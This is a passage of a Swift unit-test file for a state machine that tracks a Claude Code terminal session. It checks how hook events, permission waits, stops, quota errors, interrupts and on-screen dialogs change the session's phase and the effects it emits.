        #expect(h.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "s1")])
        #expect(h.r.phase == .thinking)
        #expect(h.r.inFlightTools.isEmpty)
        h.batch(sub: "sub-2")
        #expect(h.r.pendingWaits.count == 1)
        h.batch(sub: "sub-1")
        #expect(h.r.pendingWaits.isEmpty)
    }

    // MARK: - T13: Stop and its commit

    @Test func t13_stopIsShownAtOnceButNotCommitted() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "ls")
        h.permission("Bash", "t1", "ls")
        h.permission("Edit", "s1", "x", sub: "sub-1")
        h.advance(1)
        let fx = h.stop(prompt: nil, active: false, bg: 0, crons: 0)
        #expect(fx.isEmpty)
        #expect(h.r.phase == .done)
        // The prompt id falls back on the current prompt.
        #expect(h.r.pendingStop == PendingStop(at: h.now, promptID: "P1", stopHookActive: false, backgroundTasks: 0,
                                               sessionCrons: 0))
        #expect(h.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "s1")])
        #expect(h.r.inFlightTools.isEmpty)
    }

    @Test func t13b_quietWindowCommitsTheTurn() {
        var h = Harness.thinking()
        h.stop()
        #expect(h.tick().isEmpty)
        #expect(h.tick().isEmpty)
        let fx = h.tick()
        #expect(fx == [.card(.turnCommitted(promptID: "P1")), .playSound(.done), .notify(.turnDone),
                       .pumpQueue(afterSeconds: 1.5)])
        #expect(h.r.phase == .done)
        #expect(h.r.phaseSince == h.now)
        #expect(h.r.pendingStop == nil)
        #expect(h.r.committedStopPromptID == "P1")
        #expect(h.tick().isEmpty)
    }

    @Test func t13b_stopHookActiveDoublesTheWindow() {
        var h = Harness.thinking()
        h.stop(active: true)
        #expect(h.tick(after: 3).isEmpty)
        #expect(h.tick(after: 2.5).isEmpty)
        #expect(h.tick(after: 0.5).contains(.card(.turnCommitted(promptID: "P1"))))
    }

    @Test func t13b_theScreenMustShowTheInputBoxWithoutSpinner() {
        var h = Harness.thinking()
        h.stop()
        h.advance(3)
        #expect(h.send(.screen(ScreenFacts(inputBox: .empty, spinnerVisible: true, recognized: true))).isEmpty)
        #expect(h.send(.screen(ScreenFacts(inputBox: .unknown, recognized: true))).isEmpty)
        #expect(h.tick().isEmpty)
        let fx = h.send(.screen(ScreenFacts(inputBox: .draft(prefix: "et"), recognized: true)))
        #expect(fx.first == .card(.turnCommitted(promptID: "P1")))

        // An unrecognised screen does not block the commit.
        var g = Harness.thinking()
        g.stop()
        g.advance(3)
        #expect(!g.send(.screen(ScreenFacts(inputBox: .unknown, spinnerVisible: true, recognized: false))).isEmpty)
    }

    @Test func t13b_noPumpWhenAutoChainIsOff() {
        var h = Harness.thinking()
        h.config.autoChainQueue = false
        let fx = h.stopAndCommit()
        #expect(fx == [.card(.turnCommitted(promptID: "P1")), .playSound(.done), .notify(.turnDone)])
    }

    @Test func t13b_cronsCommitTheTurnWithoutPump() {
        var h = Harness.thinking()
        let fx = h.stopAndCommit(crons: 1)
        #expect(fx == [.card(.turnCommitted(promptID: "P1")), .playSound(.done), .notify(.turnDone)])
        #expect(h.r.phase == .waitingBackground(tasks: 0, crons: 1))
    }

    @Test func t13b_backgroundTasksWaitWithoutCommitting() {
        var h = Harness.thinking()
        let fx = h.stopAndCommit(bg: 2, crons: 1)
        #expect(fx == [.card(.turnWaitingBackground)])
        #expect(h.r.phase == .waitingBackground(tasks: 2, crons: 1))
        #expect(h.r.kind == .waitingBackground)
    }

    @Test func t13c_aMainEventCancelsTheProvisionalStop() {
        var h = Harness.thinking()
        h.stop()
        h.advance(1)
        let fx = h.pre("Bash", "t1", "npm test", prompt: "P1")
        #expect(fx.isEmpty)
        #expect(h.r.pendingStop == nil)
        #expect(h.r.phase == .working(.bash))
        for _ in 0..<10 { #expect(h.tick().isEmpty) }
    }

    @Test func t13c_notificationsSubagentsAndSessionEventsKeepTheProvisionalStop() {
        var h = Harness.thinking()
        h.stop()
        h.notification("idle_prompt")
        h.pre("Bash", "s1", sub: "sub-1")
        h.hook(.preCompact, .compact(pre: true))
        h.hook(.cwdChanged, .cwdChanged("/p"))
        #expect(h.r.pendingStop != nil)
        #expect(h.tick(after: 3).contains(.card(.turnCommitted(promptID: "P1"))))
    }

    @Test func t13c_theSamePromptReopensACommittedTurn() {
        var h = Harness.thinking()
        h.stopAndCommit()
        h.advance(2)
        let fx = h.pre("Bash", "t1", "npm test", prompt: "P1")
        #expect(fx == [.card(.turnReopened(promptID: "P1"))])
        #expect(h.r.committedStopPromptID == nil)
        #expect(h.r.phase == .working(.bash))
        // Only once.
        #expect(h.post("Bash", "t1", prompt: "P1").isEmpty)
    }

    @Test func t13c_anotherPromptOrNoPromptDoesNotReopen() {
        var h = Harness.thinking()
        h.stopAndCommit()
        #expect(h.pre("Bash", "t1", prompt: "P2").isEmpty)
        var g = Harness.thinking()
        g.stopAndCommit()
        #expect(g.pre("Bash", "t1").isEmpty)
        #expect(g.r.committedStopPromptID == "P1")
    }

    @Test func t13c_userPromptSubmitCommitsAProvisionalStopQuietly() {
        var h = Harness.thinking()
        h.stop()
        h.advance(1)
        let fx = h.submit("Et maintenant ?", prompt: "P2")
        #expect(fx == [.card(.turnCommitted(promptID: "P1"))])
        #expect(h.r.phase == .thinking)
        #expect(h.r.pendingStop == nil)
        #expect(h.r.committedStopPromptID == nil)
    }

    // MARK: - T14: StopFailure and quota

    @Test func t14_rateLimitPausesForQuota() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "ls")
        h.permission("Bash", "t1", "ls")
        let fx = h.stopFailure("rate_limit")
        #expect(fx == [.raiseGlobalIssue(.quota(resetAt: nil))])
        #expect(h.r.phase == .quotaPaused(resetAt: nil, autoResume: true))
        #expect(h.r.pendingWaits.isEmpty && h.r.inFlightTools.isEmpty)
    }

    @Test(arguments: ["authentication_failed", "oauth_org_not_allowed", "account_on_hold", "billing_error"])
    func t14b_accountErrorsRaiseOneGlobalIssue(type: String) {
        var h = Harness.thinking()
        let fx = h.stopFailure(type)
        #expect(fx == [.raiseGlobalIssue(.account(type))])
        #expect(h.r.phase == .error(.account(type)))
        // A later working turn proves the account works again.
        #expect(h.submit("Réessaie", prompt: "P2") == [.clearGlobalIssue(.account)])
    }

    @Test func t14c_otherErrorsFailTheTurn() {
        var h = Harness.thinking()
        let fx = h.stopFailure("overloaded")
        #expect(fx == [.card(.turnFailed), .notify(.error(.api("overloaded"))), .playSound(.error)])
        #expect(h.r.phase == .error(.api("overloaded")))
        var g = Harness.thinking()
        g.stopFailure(nil)
        #expect(g.r.phase == .error(.api("unknown")))
    }

    @Test func t14d_autoResumeFiredResumesThinking() {
        var h = Harness.thinking()
        h.stopFailure("rate_limit")
        h.advance(60)
        let fx = h.notification("quota_auto_resume_fired")
        #expect(fx == [.clearGlobalIssue(.quota)])
        #expect(h.r.phase == .thinking)

        var g = Harness.thinking()
        #expect(g.notification("quota_auto_resume_fired").isEmpty)
        #expect(g.r.phase == .thinking)
    }

    @Test func t14e_staleAutoResumeWaitsForEnter() {
        var h = Harness.thinking()
        h.stopFailure("rate_limit")
        let fx = h.notification("quota_auto_resume_stale")
        #expect(fx == newWaitEffects(.notification(type: "quota_auto_resume_stale")))
        #expect(h.r.phase == .quotaPaused(resetAt: nil, autoResume: true))
        // The input box is where Enter is pressed: the screen cannot lift this wait.
        h.advance(5)
        h.send(.screen(ScreenFacts(inputBox: .empty, recognized: true)))
        #expect(h.r.kind == .waitingInput)
        // The task goes on.
        let resumed = h.pre("Bash", "t1", "npm test")
        #expect(resumed == [.clearGlobalIssue(.quota)])
        #expect(h.r.pendingWaits.isEmpty)
        #expect(h.r.phase == .working(.bash))
    }

    @Test func t14e_disabledAutoResumeStaysPaused() {
        var h = Harness.thinking()
        h.stopFailure("rate_limit")
        #expect(h.notification("quota_auto_resume_disabled").isEmpty)
        #expect(h.r.phase == .quotaPaused(resetAt: nil, autoResume: false))
        var g = Harness.thinking()
        g.notification("quota_auto_resume_disabled")
        #expect(g.r.phase == .thinking)
    }

    // MARK: - T15–T18

    @Test func t15_subagentsAreCounted() {
        var h = Harness.thinking()
        h.hook(.subagentStart, .subagent(started: true, type: "Explore"), sub: "sub-1")
        h.hook(.subagentStart, .subagent(started: true, type: "Plan"), sub: "sub-2")
        #expect(h.r.activeSubagents == 2)
        h.permission("Bash", "s1", "ls", sub: "sub-1")
        h.permission("Bash", "s2", "ls", sub: "sub-2")
        h.hook(.subagentStop, .subagent(started: false, type: "Explore"), sub: "sub-1")
        #expect(h.r.activeSubagents == 1)
        #expect(h.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "s2")])
        h.hook(.subagentStop, .subagent(started: false, type: nil), sub: "sub-2")
        h.hook(.subagentStop, .subagent(started: false, type: nil), sub: "sub-3")
        #expect(h.r.activeSubagents == 0)
    }

    /// SubagentStart fires again when a subagent resumes or a teammate takes a new message; SubagentStop also
    /// fires for internal agents that never started (hooks.md).
    @Test func t15_subagentsAreCountedByID() {
        var h = Harness.thinking()
        for _ in 0..<3 { h.hook(.subagentStart, .subagent(started: true, type: "Explore"), sub: "A") }
        #expect(h.r.activeSubagents == 1)
        h.hook(.subagentStop, .subagent(started: false, type: ""), sub: "prompt-suggestion")
        #expect(h.r.activeSubagents == 1)
        h.hook(.subagentStart, .subagent(started: true, type: "Plan"), sub: "B")
        h.hook(.subagentStop, .subagent(started: false, type: "Explore"), sub: "A")
        #expect(h.r.activeSubagentIDs == ["B"])
        // Without agent_id the event cannot be attributed.
        h.hook(.subagentStart, .subagent(started: true, type: "Explore"))
        #expect(h.r.activeSubagents == 1)
    }

    @Test func t16_compactionChangesNoState() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "ls")
        let before = h.r
        #expect(h.hook(.preCompact, .compact(pre: true)).isEmpty)
        #expect(h.hook(.postCompact, .compact(pre: false)).isEmpty)
        var expected = before
        expected.lastHookAt = h.now
        expected.hookSeq = h.seq
        #expect(h.r == expected)
    }

    @Test func t17_sessionEndForClearOrResumeKeepsThePhase() {
        var h = Harness.thinking()
        let fx = h.hook(.sessionEnd, .sessionEnd(reason: "resume"))
        #expect(fx == [.endSession(sessionID: "S1", reason: "resume", at: h.now)])
        #expect(h.r.phase == .thinking)
        #expect(h.r.currentSessionID == nil)
    }

    @Test func t18_sessionEndThenExitEndsTheSessionOnce() {
        var h = Harness.running()
        #expect(h.hook(.sessionEnd, .sessionEnd(reason: "prompt_input_exit"))
                == [.endSession(sessionID: "S1", reason: "prompt_input_exit", at: h.now)])
        #expect(h.r.phase == .idle)
        let fx = h.send(.processExited(code: 0))
        #expect(fx == [.card(.sessionLost)])
        #expect(h.r.phase == .offline(.exited))
    }

    // MARK: - T19–T21: process end

    @Test func t19_cleanExitGoesOfflineAndClearsEverything() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "ls")
        h.permission("Bash", "t1", "ls")
        h.hook(.subagentStart, .subagent(started: true, type: nil), sub: "sub-1")
        h.advance(1)
        let fx = h.send(.processExited(code: 0))
        #expect(fx == [.endSession(sessionID: "S1", reason: "processExit", at: h.now), .card(.sessionLost)])
        #expect(h.r.phase == .offline(.exited))
        #expect(h.r.pid == nil && h.r.currentSessionID == nil && h.r.currentPromptID == nil)
        #expect(h.r.pendingWaits.isEmpty && h.r.inFlightTools.isEmpty && h.r.activeSubagents == 0)
    }

    @Test func t19_closeRequestedMakesTheExitACleanClose() {
        var h = Harness.thinking()
        #expect(h.send(.closeRequested).isEmpty)
        #expect(h.r.closeRequestedAt == h.now)
        #expect(h.r.phase == .thinking)
        let fx = h.send(.processExited(code: 1))
        #expect(fx == [.endSession(sessionID: "S1", reason: "processExit", at: h.now), .card(.sessionLost)])
        #expect(h.r.phase == .offline(.closedByUser))
        #expect(h.r.closeRequestedAt == nil)
    }

    @Test func t20_crashIsAnErrorAndNotifies() {
        var h = Harness.thinking()
        let fx = h.send(.processExited(code: 137))
        #expect(fx == [.notify(.error(.crashed(137))), .endSession(sessionID: "S1", reason: "processExit", at: h.now),
                       .card(.sessionLost)])
        #expect(h.r.phase == .error(.crashed(137)))
        var g = Harness.running()
        g.send(.processExited(code: nil))
        #expect(g.r.phase == .error(.crashed(nil)))
    }

    @Test func t20_secondExitAndLateHooksAreIgnored() {
        var h = Harness.thinking()
        h.send(.processExited(code: 0))
        let after = h.r
        #expect(h.send(.processExited(code: 1)).isEmpty)
        #expect(h.stop().isEmpty)
        #expect(h.permission("Bash", "t1", "ls").isEmpty)
        #expect(h.r == after)
    }

    @Test func t20_exitDuringADeliveryFailsIt() {
        var h = Harness.running()
        h.send(.deliveryStarted(PendingDelivery(itemID: "card-1", prefix: "x", startedAt: h.now, hookSeqAtStart: 1)))
        let fx = h.send(.processExited(code: 0))
        #expect(fx.contains(.card(.deliveryFailed(.processGone))))
        #expect(h.r.pendingDelivery == nil)
    }

    @Test func t20_exitWhilePausedForQuotaClearsTheIssue() {
        var h = Harness.thinking()
        h.stopFailure("rate_limit")
        #expect(h.send(.processExited(code: 0)).contains(.clearGlobalIssue(.quota)))
    }

    @Test func t21_failedLaunchIsAnError() {
        var h = Harness()
        let fx = h.send(.processFailedToStart("claude introuvable"))
        #expect(fx.isEmpty)
        #expect(h.r.phase == .error(.launchFailed("claude introuvable")))
        #expect(h.r.pid == nil)
    }

    // MARK: - T22: interruption

    @Test func t22_interruptOnlyWhileWorkingWithoutWait() {
        var h = Harness.thinking()
        let fx = h.send(.userInterrupt)
        #expect(fx == [.setQueuePaused(true), .card(.interrupted)])
        #expect(h.r.interruptRequestedAt == h.now)
        #expect(h.r.phase == .thinking)
        // No second ESC.
        #expect(h.send(.userInterrupt).isEmpty)

        var idle = Harness.running()
        #expect(idle.send(.userInterrupt).isEmpty)
        #expect(idle.r.interruptRequestedAt == nil)

        var waiting = Harness.thinking()
        waiting.permission("Bash", "t1", "ls")
        #expect(waiting.send(.userInterrupt).isEmpty)

        var paused = Harness.thinking()
        paused.stopFailure("rate_limit")
        #expect(paused.send(.userInterrupt).isEmpty)
    }

    @Test func t22b_quietTerminalConfirmsTheInterrupt() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "sleep 100")
        h.send(.outputActivity)
        h.send(.userInterrupt)
        #expect(h.tick(after: 0.5).isEmpty)
        #expect(h.r.interruptRequestedAt != nil)
        h.advance(0.3)
        h.send(.outputActivity)
        #expect(h.tick(after: 0.7).isEmpty)
        #expect(h.r.phase == .working(.bash))
        h.tick(after: 0.5)
        #expect(h.r.phase == .idle)
        #expect(h.r.interruptRequestedAt == nil)
        #expect(h.r.inFlightTools.isEmpty)
    }

    @Test func t22b_aVisibleSpinnerMeansStillRunning() {
        var h = Harness.thinking()
        h.send(.userInterrupt)
        h.advance(1.5)
        h.send(.screen(ScreenFacts(inputBox: .empty, spinnerVisible: true, recognized: true)))
        #expect(h.r.phase == .thinking)
        h.advance(0.5)
        h.send(.screen(ScreenFacts(inputBox: .empty, recognized: true)))
        #expect(h.r.phase == .idle)
    }

    @Test func t22c_interruptThatDidNotTakeGivesUpOnce() {
        var h = Harness.thinking()
        h.send(.userInterrupt)
        h.advance(0.5)
        h.pre("Bash", "t1", "npm test")
        #expect(h.tick(after: 1.5).isEmpty)
        let fx = h.tick(after: 1)
        #expect(fx == [.showMessage("L'interruption n'a pas pris : ouvre le terminal")])
        #expect(h.r.interruptRequestedAt == nil)
        #expect(h.r.phase == .working(.bash))
        #expect(h.tick().isEmpty)
    }

    @Test func t22_stopOrPromptAfterTheRequestSettlesIt() {
        var h = Harness.thinking()
        h.send(.userInterrupt)
        h.submit("Message en file", prompt: "P2")
        #expect(h.r.interruptRequestedAt == nil)
        var g = Harness.thinking()
        g.send(.userInterrupt)
        g.stop()
        #expect(g.r.interruptRequestedAt == nil)
    }

    // MARK: - T23–T24b

    @Test func t23_keystrokeTonesDownAWaitWithoutLiftingIt() {
        var h = Harness.thinking()
        h.permission("Bash", "t1", "ls")
        #expect(h.send(.userKeystroke(.enter)).isEmpty)
        #expect(h.r.acknowledgedWaiting)
        #expect(h.r.kind == .waitingInput)
        var g = Harness.running()
        #expect(g.send(.userKeystroke(.printable)) == [.resampleScreen(afterSeconds: 0.3)])
    }

    /// Degraded mode with screen patterns that do not know this Claude Code version: nothing but the user can
    /// lift "look at the terminal".
    @Test func t23_inDegradedModeTypingLiftsTheTerminalWait() {
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        let unknownScreen = ScreenFacts(inputBox: .unknown, recognized: false)
        for _ in 0..<20 {
            h.tick()
            h.send(.screen(unknownScreen))
        }
        #expect(h.r.hookHealth == .degraded)
        #expect(h.r.pendingWaits.keys.map { $0 } == [.terminal])
        for _ in 0..<600 { h.tick() }
        #expect(h.r.kind == .waitingInput)
        #expect(h.send(.userKeystroke(.navigation)).isEmpty)
        #expect(h.r.kind == .waitingInput)
        #expect(h.send(.userKeystroke(.enter)) == [.resampleScreen(afterSeconds: 0.3)])
        #expect(h.r.pendingWaits.isEmpty)
        #expect(!h.r.acknowledgedWaiting)
        // A later bell asks again; any answer key lifts it.
        h.send(.bell)
        h.send(.userKeystroke(.printable))
        #expect(h.r.pendingWaits.isEmpty)
    }

    @Test func t23_beforeDegradedModeTypingDoesNotLiftTheTerminalWait() {
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        h.tick(after: 9)
        #expect(h.r.pendingWaits.keys.map { $0 } == [.terminal])
        h.send(.userKeystroke(.enter))
        #expect(h.r.pendingWaits.count == 1)
        #expect(h.r.acknowledgedWaiting)
    }

    @Test func t24_acknowledgingACommittedTurnGoesIdle() {
        var h = Harness.thinking()
        h.stop()
        #expect(h.send(.acknowledged).isEmpty)
        #expect(h.r.phase == .done)
        h.tick(after: 3)
        h.send(.acknowledged)
        #expect(h.r.phase == .idle)

        var g = Harness.thinking()
        g.permission("Bash", "t1", "ls")
        g.send(.acknowledged)
        #expect(g.r.acknowledgedWaiting)
        #expect(g.r.phase == .thinking)
    }

    @Test func t24b_doneBecomesIdleAfterTenMinutes() {
        var h = Harness.thinking()
        h.stopAndCommit()
        #expect(h.tick(after: 599).isEmpty)
        #expect(h.r.phase == .done)
        h.tick(after: 1)
        #expect(h.r.phase == .idle)
    }

    // MARK: - T25–T28

    @Test func t25_silentLaunchAsksToLookAtTheTerminalOnce() {
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        for _ in 0..<7 { #expect(h.tick().isEmpty) }
        let fx = h.tick()
        #expect(fx == newWaitEffects(.terminal))
        #expect(h.r.pendingWaits[.terminal]?.reason == .terminal)
        #expect(h.r.phase == .launching)
        #expect(h.tick().isEmpty)
        // SessionStart finally arrives: the wait goes away.
        h.hook(.sessionStart, .sessionStart(source: .startup, model: nil))
        #expect(h.r.pendingWaits.isEmpty)
        #expect(h.r.phase == .idle)
    }

    @Test func t25_noTerminalWaitWhileOutputFlowsOrThePromptIsVisible() {
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        h.advance(7)
        h.send(.outputActivity)
        #expect(h.tick(after: 2).isEmpty)
        var g = Harness()
        g.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        g.send(.screen(ScreenFacts(inputBox: .empty, recognized: true)))
        #expect(g.tick(after: 9).isEmpty)
    }

    @Test func t26_noHookAfterFifteenSecondsIsDegradedMode() {
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        h.send(.screen(ScreenFacts(inputBox: .empty, recognized: true)))
        h.tick(after: 14)
        #expect(h.r.hookHealth == .unknown(since: Harness.t0))
        let fx = h.tick(after: 1)
        #expect(fx == [.showMessage("Aucun hook reçu : mode dégradé")])
        #expect(h.r.hookHealth == .degraded)
        // Silent PTY in degraded mode: idle.
        #expect(h.r.phase == .idle)
        #expect(h.tick().isEmpty)
    }

    @Test func t27_noNewsForTenMinutesIsStale() {
        var h = Harness.thinking()
        h.send(.outputActivity)
        #expect(h.tick(after: 599).isEmpty)
        let fx = h.tick(after: 1)
        #expect(fx == [.reconcile])
        #expect(h.r.stale)
        #expect(h.tick().isEmpty)
        h.send(.outputActivity)
        #expect(!h.r.stale)
        h.tick(after: 200)
        #expect(h.r.stale)
        h.pre("Bash", "t1", "ls")
        #expect(!h.r.stale)
    }

    @Test func t27_recentOutputIsNotStale() {
        var h = Harness.thinking()
        h.advance(599)
        h.send(.outputActivity)
        #expect(h.tick(after: 60).isEmpty)
        #expect(!h.r.stale)
    }

    @Test func t28_screenLiftsCatchUpWaitsAfterTwoSeconds() {
        var h = Harness.thinking()
        h.notification("permission_prompt")
        let prompt = ScreenFacts(inputBox: .empty, recognized: true)
        h.advance(1)
        #expect(h.send(.screen(prompt)).isEmpty)
        #expect(h.r.screen == prompt)
        #expect(h.r.pendingWaits.count == 1)
        h.advance(1.5)
        h.send(.screen(ScreenFacts(inputBox: .empty, dialogVisible: true, recognized: true)))
        #expect(h.r.pendingWaits.count == 1)
        h.send(.screen(ScreenFacts(inputBox: .empty, recognized: false)))
        #expect(h.r.pendingWaits.count == 1)
        h.send(.screen(prompt))
        #expect(h.r.pendingWaits.isEmpty)
    }

    @Test func t28_screenNeverLiftsToolWaits() {
        var h = Harness.thinking()
        h.permission("Bash", "t1", "ls")
        h.advance(10)
        h.send(.screen(ScreenFacts(inputBox: .empty, recognized: true)))
        #expect(h.r.pendingWaits.count == 1)
    }

    // MARK: - T28b: Esc on a dialog, closed by the screen

    static func realScreen(_ name: String) throws -> ScreenFacts {
        try ScreenFixtures.facts("real-2.1.285/\(name)")
    }

    /// Spikes S5 and S7 (Claude Code 2.1.285): Esc on a permission dialog or on an AskUserQuestion fires no hook
    /// at all; only the screen shows the dialog is gone and the input box is back. The wait closes, the turn it
    /// ended is over (no spinner, no hook since the Esc): idle, and handled like an interrupt (T22): the card is
    /// flagged interrupted, the queue paused, nothing pumped.
    @Test func escapeRefusalClearsWaitFromScreen() throws {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "touch spike-refus.txt")
        h.permission("Bash", nil, "touch spike-refus.txt")
        h.send(.screen(try Self.realScreen("S5-03-permission")))
        #expect(h.r.kind == .waitingInput)
        h.advance(4)
        #expect(h.send(.userKeystroke(.escape)) == [.resampleScreen(afterSeconds: 0.3)])
        #expect(h.r.escapedDialogAt == h.now)
        #expect(h.r.acknowledgedWaiting)
        #expect(h.r.kind == .waitingInput)
        h.advance(0.3)
        #expect(h.send(.screen(try Self.realScreen("S5-04-apres-echap"))) == [.setQueuePaused(true), .card(.interrupted)])
        #expect(h.r.pendingWaits.isEmpty)
        #expect(!h.r.acknowledgedWaiting)
        #expect(h.r.inFlightTools.isEmpty)
        #expect(h.r.phase == .idle)
        #expect(h.r.escapedDialogAt == nil)
        // Free again: a delivery may start.
        let delivery = PendingDelivery(itemID: "card-2", prefix: "x", startedAt: h.now, hookSeqAtStart: h.r.hookSeq)
        h.send(.deliveryStarted(delivery))
        #expect(h.r.pendingDelivery == delivery)

        var g = Harness.thinking()
        let q = AskedQuestion(header: "Couleur", question: "Choisissez votre couleur préférée",
                              options: ["Rouge", "Bleu"], multiSelect: false)
        g.hook(.preToolUse, .askUserQuestion(toolUseID: "q1", questions: [q]))
        g.permission("AskUserQuestion", nil, "Choisissez votre couleur préférée")
        g.send(.screen(try Self.realScreen("S7-03-question")))
        g.advance(8)
        g.send(.userKeystroke(.escape))
        g.advance(0.3)
        let fx = g.send(.screen(try Self.realScreen("S7-04-apres-echap")))
        #expect(fx.compactMap(\.cardSignal) == [.interrupted] && !fx.contains(where: \.isPump))
        #expect(fx == [.setQueuePaused(true), .card(.interrupted)])
        #expect(g.r.pendingWaits.isEmpty)
        #expect(g.r.phase == .idle)
        // The next reading changes nothing more.
        g.advance(1)
        #expect(g.send(.screen(try Self.realScreen("S7-04-apres-echap"))).isEmpty)
    }

    /// Without a prior Esc, a screen without dialog closes nothing: the dialog may simply not be drawn yet.
    /// Any key after the Esc (an answer, a move in the dialog) cancels the Esc reading.
    @Test func screenWithoutDialogClosesNothingWithoutEscape() throws {
        let noDialog = try Self.realScreen("S5-04-apres-echap")
        var h = Harness.thinking()
        h.pre("Bash", "t1", "touch x")
        h.permission("Bash", "t1", "touch x")
        h.advance(10)
        #expect(h.send(.screen(noDialog)).isEmpty)
        #expect(h.r.pendingWaits.count == 1)
        #expect(h.r.phase == .working(.bash))
        h.send(.userKeystroke(.printable))
        h.send(.screen(noDialog))
        #expect(h.r.pendingWaits.count == 1)
        #expect(h.r.escapedDialogAt == nil)

        for key in [KeyClass.navigation, .enter, .printable, .control] {
            var g = Harness.thinking()
            g.permission("Bash", "t1", "touch x")
            g.send(.userKeystroke(.escape))
            g.send(.userKeystroke(key))
            #expect(g.r.escapedDialogAt == nil, "\(key)")
            g.advance(0.3)
            g.send(.screen(noDialog))
            #expect(g.r.pendingWaits.count == 1, "\(key)")
        }

        // Esc with no dialog wait open is an ordinary keystroke (T23).
        var idle = Harness.running()
        #expect(idle.send(.userKeystroke(.escape)) == [.resampleScreen(afterSeconds: 0.3)])
        #expect(idle.r.escapedDialogAt == nil)
        var catchUp = Harness.thinking()
        catchUp.notification("permission_prompt")
        #expect(catchUp.send(.userKeystroke(.escape)).isEmpty)
        #expect(catchUp.r.escapedDialogAt == nil)
    }

    /// The refusal does not end the turn when the spinner is still there or a hook came after the Esc: the phase
    /// is then the turn's, as after a tool result, and nothing is interrupted (no card signal, queue untouched).
    /// A dialog opened after the Esc is not closed by it.
    @Test func escapeRefusalKeepsATurnThatGoesOn() {
        let prompt = ScreenFacts(inputBox: .empty, recognized: true)
        var h = Harness.thinking()
        h.hook(.preToolUse, .askUserQuestion(toolUseID: "q1", questions: []))
        h.send(.userKeystroke(.escape))
        h.advance(0.3)
        #expect(h.send(.screen(ScreenFacts(inputBox: .empty, spinnerVisible: true, recognized: true))).isEmpty)
        #expect(h.r.pendingWaits.isEmpty)
        #expect(h.r.phase == .thinking)

        var g = Harness.thinking()
        g.pre("Bash", "t1", "touch x")
        g.permission("Bash", "t1", "touch x")
        g.send(.userKeystroke(.escape))
        g.advance(0.2)
        g.pre("Read", "t2", "a.txt")
        g.permission("Read", "t2", "a.txt")
        g.advance(0.1)
        #expect(g.send(.screen(prompt)).isEmpty)
        #expect(g.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "t2")])
        #expect(g.r.inFlightKinds == ["t2": .read])
        #expect(g.r.phase == .working(.read))

        // A subagent's dialog closes too, but says nothing about the main turn.
        var s = Harness.thinking()
        s.pre("Agent", "a1", "explore")
        s.permission("Bash", "s1", "ls", sub: "sub-1")
        s.send(.userKeystroke(.escape))
        s.advance(0.3)
        #expect(s.send(.screen(prompt)).isEmpty)
        #expect(s.r.pendingWaits.isEmpty)
        #expect(s.r.phase == .working(.subagent))

        // A Stop after the Esc settles the turn by itself: no interrupt either.
        var d = Harness.thinking()
        d.permission("Bash", "t1", "touch x")
        d.send(.userKeystroke(.escape))
        d.stop()
        #expect(d.r.pendingWaits.isEmpty)
        d.advance(0.3)
        #expect(d.send(.screen(prompt)).compactMap(\.cardSignal).isEmpty)
    }

    /// Claude Code may not have redrawn yet: the screen is read again while the dialog is still shown, for a few
    /// seconds at most; after that the Esc no longer counts.
    @Test func escapeRefusalRereadsTheScreenForAFewSeconds() {
        let dialog = ScreenFacts(inputBox: .unknown, dialogVisible: true, recognized: true)
        var h = Harness.thinking()
        h.permission("Bash", "t1", "touch x")
        h.send(.userKeystroke(.escape))
        h.advance(0.3)
        #expect(h.send(.screen(dialog)) == [.resampleScreen(afterSeconds: 0.3)])
        h.advance(0.3)
        #expect(h.send(.screen(ScreenFacts())) == [.resampleScreen(afterSeconds: 0.3)])
        h.advance(0.3)
        h.send(.screen(ScreenFacts(inputBox: .empty, recognized: true)))
        #expect(h.r.pendingWaits.isEmpty)

        var g = Harness.thinking()
        g.permission("Bash", "t1", "touch x")
        g.send(.userKeystroke(.escape))
        g.advance(3)
        #expect(g.send(.screen(dialog)).isEmpty)
        #expect(g.r.escapedDialogAt == nil)
        g.advance(1)
        g.send(.screen(ScreenFacts(inputBox: .empty, recognized: true)))
        #expect(g.r.pendingWaits.count == 1)

        // Waits already resolved by hooks: nothing left to close, the Esc reading ends.
        var r = Harness.thinking()
        r.pre("Bash", "t1", "touch x")
        r.permission("Bash", "t1", "touch x")
        r.send(.userKeystroke(.escape))
        r.post("Bash", "t1")
        #expect(r.send(.screen(ScreenFacts(inputBox: .empty, recognized: true))).isEmpty)
        #expect(r.r.escapedDialogAt == nil)
        #expect(r.r.phase == .thinking)
    }

    // MARK: - T29–T31

    @Test func t29_cwdChangeUpdatesTheSession() {
        var h = Harness.thinking()
        #expect(h.hook(.cwdChanged, .cwdChanged("/p/worktree")) == [.updateSessionCwd(sessionID: "S1", cwd: "/p/worktree")])
        #expect(h.hook(.cwdChanged, .cwdChanged("/tmp"), sub: "sub-1").isEmpty)
    }

    @Test func t30_deliveryStartsOnlyWhenFree() {
        let delivery = PendingDelivery(itemID: "card-1", prefix: "Corrige", startedAt: Harness.t0, hookSeqAtStart: 1)
        var idle = Harness.running()
        #expect(idle.send(.deliveryStarted(delivery)).isEmpty)
        #expect(idle.r.pendingDelivery == delivery)

        var committed = Harness.thinking()
        committed.stopAndCommit()
        committed.send(.deliveryStarted(delivery))
        #expect(committed.r.pendingDelivery == delivery)

        var provisional = Harness.thinking()
        provisional.stop()
        provisional.send(.deliveryStarted(delivery))
        #expect(provisional.r.pendingDelivery == nil)

        var working = Harness.thinking()
        working.send(.deliveryStarted(delivery))
        #expect(working.r.pendingDelivery == nil)

        var waiting = Harness.running()
        waiting.notification("agent_needs_input")
